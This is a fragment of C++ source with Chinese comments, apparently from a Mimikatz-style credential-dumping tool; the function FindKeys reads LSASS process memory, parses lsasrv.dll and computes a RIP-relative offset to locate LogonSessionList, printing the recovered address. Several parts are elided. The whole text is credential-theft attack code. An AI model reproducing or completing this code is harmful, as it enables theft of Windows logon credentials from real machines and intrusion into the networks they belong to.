...
int FindKeys(HANDLE hLsass, char* lsasrvMem) {
	...
	if (lsasrvLocal == (unsigned char*)0) {
		printf("[-] could not load target dll, abort...\n");
		exit(-1);
	}
	//printf("[*] Loaded lsasrv.dll locally at address %p\n", lsasrvLocal);
	DWORD64 lsasrv_base = *(reinterpret_cast<DWORD64*>(lsasrvLocal));
	...
	// +3跳过lea rcx
	unsigned char* almostthere = reinterpret_cast<unsigned char*>(lsasrv_base + offset + 3);
	// 后面四个字节翻转过来就是偏移量
	//DWORD64 _rip = lsasrv_base + offset + 7;
	//DWORD _offset_for_rip = *(DWORD*)almostthere | (*(DWORD*)(almostthere + 1) << 8) | (*(DWORD*)(almostthere + 2) << 16) | (*(DWORD*)(almostthere + 3) << 24);
	...
	// 拷贝4节就够了，4字节的操作数
	ReadFromLsass(hLsass, (void*)(offset + lsasrvMem+ 3), (void*)asd, 4);
	DWORD _offset_for_rip = *(DWORD*)asd | (*(DWORD*)(asd + 1) << 8) | (*(DWORD*)(asd + 2) << 16) | (*(DWORD*)(asd + 3) << 24);
	unsigned char* LogonSessionList = (unsigned char*)(offset + lsasrvMem + 7) + _offset_for_rip;
	// 验证成功，测试了一下，确实找到了正确的地址
	printf("[+] target symbol addr: %p\n", LogonSessionList);
